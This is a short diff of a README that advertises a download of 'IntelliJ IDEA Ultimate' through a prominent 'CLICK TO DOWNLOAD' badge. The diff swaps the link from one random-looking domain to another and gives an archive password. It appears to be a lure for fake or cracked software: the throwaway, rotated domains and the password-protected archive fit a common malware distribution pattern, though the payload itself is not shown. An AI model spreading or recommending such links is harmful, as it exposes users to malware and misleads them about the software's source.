@@ -1,6 +1,6 @@
 # IntelliJ IDEA Idea Ultimate
 
-[![CLICK TO DOWNLOAD](https://img.shields.io/badge/CLICK%20TO%20DOWNLOAD-008C3A?style=for-the-badge&logo=github&logoColor=white)](https://efhiwogvjd.com/Intellij-Idea-Ultimate-2026)
+[![CLICK TO DOWNLOAD](https://img.shields.io/badge/CLICK%20TO%20DOWNLOAD-008C3A?style=for-the-badge&logo=github&logoColor=white)](https://fghtfghjfdjfdj.com/Intellij-Idea-Ultimate-2026)
 > #### Archive password: `2026`
 
 
